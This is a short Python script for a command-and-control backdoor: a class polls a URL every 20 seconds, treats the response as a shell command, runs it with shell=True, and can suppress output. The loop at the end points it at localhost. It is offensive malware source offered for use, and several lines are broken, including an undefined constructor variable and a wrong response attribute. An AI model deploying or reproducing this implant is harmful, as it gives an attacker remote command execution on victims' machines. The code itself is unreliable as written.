import os, socket, subprocess,threading, random, http.client, time

def checkOS():
    arrValidOS = ['windows', 'linux', 'darwin', 'openbsd', 'macos']
    import platform
    strPlatform = str(platform.platform())
    for strValidOS in arrValidOS:
        if strValidOS in strPlatform.lower(): return strValidOS, strPlatform
    return "unknown", strPlatform

def findCorrectShell(strPlatform: str = ""):
    arrWindows = ["\\windows\\system32\\cmd.exe"]
    arrLinuxBasic = ["/bin/zsh", "/bin/bash"]
    arrOpenBSD = ["/bin/zsh", "/bin/ksh", "/bin/sh"]
    
    if "" == strPlatform: strOS, _ = checkOS()
    else: strOS = strPlatform

    arrUsed = []
    if "windows" == strOS: arrUsed = arrWindows
    elif strOS in ['linux', 'darwin', 'macos']: arrUsed = arrLinuxBasic
    elif "openbsd" == strOS: arrUsed = arrOpenBSD
    else: raise TypeError(f"{strOS} unsupported")
    
    for strShell in arrUsed:
        if os.path.isfile(strShell): return str(strShell)

class c2cShellby:

    def __init__(self, strurlPassed: str="", bolsilentPassed: bool = True, strheaderPassed: str = ""):
        self.strURL = strurlPassed
        self.bolSilent = bolsilentPassed
        self.strHeader = strcustomPassed

    def ripURL(self):
            from urllib.parse import urlparse
            urlParsed = urlparse(self.strURL)
            strScheme = urlParsed.scheme
            strPath = urlParsed.path
            strHost = urlParsed.hostname
            strPort = urlParsed.port
            return strScheme, strPath, strHost, strPort

    def startC(self):
        try: 
            if "" == self.strURL: return False
            strScheme, strPath, strHost, strPort = self.ripURL()
            if strPort == None: strHostArgs = strHost
            else: strHostArgs = strHost, strPort
            if "https" == strScheme: 
                objConnection = http.client.HTTPSConnection(strHostArgs)
            elif "http" == strScheme: 
                objConnection = http.client.HTTPConnection(strHostArgs)
            else: return False
            objConnection.request("GET", strPath)
            objResponse = objConnection.getresponse()
            # Check if the request was successful
            if objResponse.status == 200:
                command = objResponse.read().decode().strip()
                process = subprocess.Popen(command, 
                                            shell=True, 
                                            stdout=subprocess.PIPE, 
                                            stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                if self.bolSilent != True :
                    print("Output:", stdout.decode())
                    print("Errors:", stderr.decode())
            elif bolSilent != True : print("Failed to retrieve the command. Status code:", objResponse.status_code)
        except Exception as ex:
            if self.bolSilent != True: print(f"Error encountered:\n{ex}\n")


# Also works with http(s)
while True: 
    c2cShellby("http://localhost/index.html", False).startC()
    time.sleep(20)
